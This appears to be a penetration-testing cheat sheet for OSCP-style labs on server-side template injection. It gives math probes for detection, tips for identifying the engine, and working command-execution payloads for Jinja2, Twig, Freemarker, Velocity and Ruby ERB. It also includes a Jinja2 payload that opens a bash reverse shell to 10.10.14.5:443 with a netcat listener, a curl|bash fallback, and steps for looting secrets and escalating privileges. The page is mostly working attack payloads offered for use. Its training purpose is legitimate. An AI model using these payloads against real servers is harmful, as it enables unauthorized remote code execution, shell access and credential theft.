# 💥 Server-Side Template Injection (SSTI)

> When user input is embedded into a **server-side template** (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty), you can inject template syntax that the engine **evaluates** — leading to data disclosure and, usually, **RCE**. Detect with a math payload, identify the engine, then run the engine-specific RCE.

Related: [[Web Exploitation]] · [[HTTP]] · [[Shells]] · [[RCE]] · [[Command Injection]]

---

## 🧠 REFLECTED INPUT → THINK
- **Test math:** `{{7*7}}` or `${7*7}` or `#{7*7}` → if the page shows **49**, it's SSTI (not plain XSS).
- **Identify the engine** — the RCE payload is engine-specific (Python/Java/PHP/Ruby differ).
- Common in: profile names, email templates, "custom message", search echoes, error pages, filenames.
- SSTI usually → **RCE**; get exec then reverse shell.

## ⚡ DETECTION → ENGINE ID
Polyglot probes (send each, see what evaluates):
```
{{7*7}}
```
```
${7*7}
```
```
#{7*7}
```
```
{{7*'7'}}        (Jinja2/Twig → 7777777 ; some engines error → helps fingerprint)
```
**Interpretation:**
- `{{7*7}}`=49 → Jinja2 (Python) or Twig (PHP). `{{7*'7'}}`=`7777777` → Jinja2; error/`49`→Twig.
- `${7*7}`=49 → Freemarker/Velocity (Java) or others.
- `#{7*7}`=49 → Ruby ERB-style / some frameworks.
Use the classic decision tree (portswigger) to narrow it; confirm with an engine-specific object.

## 📖 WHAT / WHY
- **What:** input concatenated into a template string, then rendered → attacker controls template code, not just data.
- **Why it works:** templates can access language objects/functions; reaching a "run command" object = RCE.
- **XSS vs SSTI:** XSS runs in the browser; SSTI evaluates on the **server** (math proves server-side eval).

## 💥 RCE PAYLOADS BY ENGINE
**Jinja2 (Python / Flask):**
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
**Twig (PHP):**
```
{{ ['id']|filter('system') }}
```
```
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```
**Freemarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```
**Velocity (Java):**
```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",...)   # use the standard Velocity RCE gadget
```
**Ruby ERB:**
```
<%= `id` %>
```
```
<%= system("id") %>
```

## 💥 → REVERSE SHELL
Once `id` works, swap in a reverse shell (URL-encode as needed). Jinja2 example:
```bash
nc -lvnp 443
```
```
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"').read() }}
```
**Automated (optional, may be unmaintained):** `tplmap -u "http://$IP/page?name=test"`.
**Result:** shell as the web user → [[Shells]] → privesc.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `{{7*7}}`=49 | SSTI (Python/PHP) | `{{7*'7'}}` to fingerprint | engine known |
| `${7*7}`=49 | SSTI (Java) | Freemarker/Velocity gadget | RCE |
| `id` output | RCE confirmed | reverse-shell payload | shell |
| Sandbox errors | Restricted engine | try alternate gadget / bypass | RCE or read-only |
| Only data leaks | Limited | read config/secrets objects | creds |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Math doesn't evaluate | Not SSTI (maybe XSS) — try other delimiters `${} #{} <%= %> {{}}` |
| Engine sandboxed (Jinja2) | Use alternate globals gadget (`cycler`, `joiner`, `lipsum`, `request`) |
| RCE gadget blocked | Try a different object chain for that engine; read files/env instead |
| WAF strips `{{`/`}}` | Encode, whitespace tricks, alternate syntax `{%...%}` |
| Reverse shell fails | Host a script and `curl\|bash`; change port → [[Shells]] |

## 🧹 POST-EXPLOITATION
Stabilise ([[Shells]]); loot app config/secrets (SSTI can also just read `config`/env objects) → [[Credential Attacks]]; privesc.

## ⚠️ COMMON MISTAKES
- Confusing SSTI with XSS — **prove server-side eval with math** first.
- Firing a Jinja2 payload at a Java engine (wrong gadget) — **fingerprint before RCE**.
- Not URL-encoding braces/quotes in the request.
- Overlooking SSTI in **email/PDF/report templates** and error pages.

## 🧭 OSCP EXAM MINDSET
See input reflected? Drop `{{7*7}}`/`${7*7}`. A literal `49` means the server is *executing* your template — that's a near-guaranteed RCE once you match the engine. Fingerprint, run `id` with the right gadget, then reverse shell. SSTI hides in "friendly" features like custom greetings and report generators.

## ✅ DON'T MISS
- [ ] Math probe in every reflected field (`{{7*7}}`, `${7*7}`, `#{7*7}`)
- [ ] Fingerprint the engine (`{{7*'7'}}`)
- [ ] Engine-specific `id` gadget
- [ ] Reverse shell payload (URL-encoded)
- [ ] Check email/PDF/report templates too

## 📇 CHEAT SHEET
```
{{7*7}}   ${7*7}   #{7*7}   {{7*'7'}}          # detect + fingerprint
```
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}      # Jinja2 RCE
```
```
{{ ['id']|filter('system') }}                                 # Twig RCE
```
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }   # Freemarker
```
```
<%= `id` %>                                                   # ERB (Ruby)
```
**Kill shots:** `{{7*7}}`=49 → fingerprint → engine RCE gadget → reverse shell.
